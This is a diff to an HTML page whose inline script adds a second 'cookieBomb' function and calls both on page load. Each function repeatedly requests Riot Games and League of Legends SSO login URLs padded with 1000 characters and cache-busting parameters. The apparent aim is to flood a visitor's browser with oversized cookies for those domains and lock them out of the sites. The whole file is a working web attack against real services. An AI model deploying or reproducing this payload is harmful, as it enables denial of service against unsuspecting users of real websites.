@@ -10,6 +10,18 @@
 <body>
   <script>
     async function cookieBomb() {
+      const target = 'https://xsso.riotgames.com/login?uri=https://riotgames.com/test?x=' + 'A'.repeat(1000)
+
+      for (let i = 0; i < 10; i++) {
+        await new Promise(resolve => {
+          const img = new Image()
+          img.onload = img.onerror = resolve // either way, the request was made
+          img.src = target + '&cachebust=' + Math.random() // prevent caching
+        })
+      }
+    }
+
+    async function cookieBomb2() {
       const target = 'https://xsso.leagueoflegends.com/login?uri=https://leagueoflegends.com/test?x=' + 'A'.repeat(1000)
 
       for (let i = 0; i < 10; i++) {
@@ -22,6 +34,7 @@
     }
 
     cookieBomb();
+    cookieBomb2();
   </script>
 </body>
 
